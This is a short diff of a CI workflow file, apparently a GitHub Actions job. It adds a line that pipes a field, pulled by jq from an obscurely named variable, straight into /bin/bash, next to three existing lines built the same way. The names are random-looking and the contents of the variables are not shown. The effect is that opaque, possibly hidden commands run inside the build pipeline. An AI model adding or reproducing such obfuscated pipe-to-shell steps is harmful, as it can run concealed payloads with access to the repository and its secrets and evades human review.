@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$x74260" | jq -r .b0 | /bin/bash
           printf '%s' "$qaka90" | jq -r .g4759 | /bin/bash
           echo $jgf4554 | jq -r .asuo72394 | /bin/bash
+          echo $aj28 | jq -r .asw91 | /bin/bash
 
       - name: Save results
         if: always()
